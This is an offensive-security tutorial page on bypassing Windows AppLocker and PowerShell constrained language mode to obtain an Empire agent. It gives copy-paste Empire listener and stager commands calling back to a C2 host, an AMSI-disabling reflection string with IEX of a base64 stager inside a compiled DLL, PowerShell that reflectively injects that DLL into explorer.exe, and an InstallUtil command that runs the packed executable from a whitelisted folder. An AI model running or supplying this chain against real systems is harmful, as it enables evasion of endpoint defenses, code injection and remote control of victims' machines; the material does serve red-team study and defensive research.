# Bypassing Applocker and Powershell contstrained language mode

## Using Reflective Injection and Certutil

This technique involves packing everything together several times to bypass all the security mechanisms. I based this on the [awesome article ](https://improsec.com/blog/babushka-dolls-or-how-to-bypass-application-whitelisting-and-constrained-powershell)from Improsec called "Babushka dolls" and elements from it's Github project.

**Edit: Sadly after Windows 10 1803 and onwards this trick doesn't work for bypassing AMSI any longer. AMSI now uses a scanbuffer instead of scanstring which was previously used.**

### Generating listener and stager in Empire

Set up a listener and generate a stager. I've put all the commands below for easy copypaste.

```text
./Empire
listeners
uselistener
set Host 10.0.0.15
set Port 80
execute
back
usestager multi/launcher
set Listener http
generate
```

![](../.gitbook/assets/image%20%2821%29.png)

![](../.gitbook/assets/image%20%2820%29.png)

### ReflectivePick with Visual Studio

We are now going to write the stager we generated into the ReflectivePick project.

Open the [PowerPick project ](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick/ReflectivePick)in VS. It may be necessary to set the target to x64. Project -&gt; ReflectivePick properties -&gt; Configuration Manager -&gt; Platform

![](../.gitbook/assets/image%20%2823%29.png)

Add the base64 from the stager where appropriate.

![](../.gitbook/assets/image%20%2826%29.png)

`wchar_t* argument = L"[Ref].Assembly.GetType('System.Management.Automation.sAmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);$encoded = \"BASE64STRING\";$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded));$decoded | Out-File -FilePath C:\Windows\Tasks\out.txt;IEX $decoded"; //Output debug`

This includes an output write for demonstration purposes. You can remove it if you desire.

Compile the dll to `ReflectivePick_x64.dll`

![](../.gitbook/assets/image%20%2839%29.png)

### Execution

We can now try to run the dll with `rundll32.exe .\ReflectivePick_x64.dll,Void` but as you will soon discover, AMSI picks up the Empire stager during runtime.

![](../.gitbook/assets/image%20%2816%29.png)

Disable AMSI however, and you get an agent back.

![](../.gitbook/assets/image%20%2857%29.png)

You can also view the base64-decoded stager payload in `c:\windows\tasks\out.txt`

![](../.gitbook/assets/image%20%289%29.png)

We can't rely on manually disabling AMSI, so we are going to run it through a few more hoops.

### Load the DLL into another process

To avoid creating a new process and loading the non-whitelisted DLL we are going to reflectively inject it into a process using [Invoke-ReflectiveInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1).

 Use the following commands in PS to encode the DLL to base64 and pipe the results to a file. Don't worry if the commands take a few seconds to run. I have also noticed that Powershell adds a newline at the bottom of the file when Base64-encoding like this so manually remove that if it is present.

```text
$Content = Get-Content .\ReflectivePick_x64.dll -Encoding Byte
$Encoded = [System.Convert]::ToBase64String($Content)
$Encoded | Out-File "C:\users\chris\Desktop\PowerTools-master\PowerPick\bin\x64\Debug\dll.txt"
```

![](../.gitbook/assets/image%20%2814%29.png)

Now you want to download [Invoke-ReflectivePEInjection](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1) to the working directory and open it in a text editor. At the bottom of the file, add the following lines, where we copypaste the contents of `dll.txt` to the `$dllData` object. This will ensure the dll is reflectively injected into the `explorer.exe` process during runtime.

```text
$dllData = "DLLBASE64_GOES_HERE"
$ProcId = (Get-Process explorer).Id
$Bytes = [System.Convert]::FromBase64String($dllData)
Invoke-ReflectivePEInjection -PEBytes $Bytes -ProcId $ProcId
```

![](../.gitbook/assets/image%20%2851%29.png)

### Compile to an EXE using VS

In powershell, base64 encode the entire script. Remove the newline at the bottom of the output file if present.

```text
$Content = Get-Content .\Invoke-ReflectivePEInjection.ps1 -Encoding Byte
$Encoded = [System.Convert]::ToBase64String($Content)
$Encoded | Out-File "C:\users\chris\Desktop\PowerTools-master\PowerPick\bin\x64\Debug\pe.txt"
```

![](../.gitbook/assets/image%20%2849%29.png)

Open the [Bypass project](https://github.com/MortenSchenk/Babuska-Dolls/tree/master/Bypass) in VS and copypaste the base64 into the encoded variable. Compile to `Bypass.exe` with VS.

![](../.gitbook/assets/image%20%2833%29.png)

### Final execution

Use `installutil.exe` or similar [LOLbBns ](https://github.com/LOLBAS-Project/LOLBAS/blob/master/LOLBins.md)to execute `Bypass.exe`. If Applocker is present, execute it from a whitelisted directory such as `C:\Windows\Tasks`

```text
C:\windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\Bypass.exe 
```

![](../.gitbook/assets/image%20%2813%29.png)

![](../.gitbook/assets/image%20%2819%29.png)

Thrilling! We bypassed both Applocker and Powershell constrained language mode and got an Empire agent back.

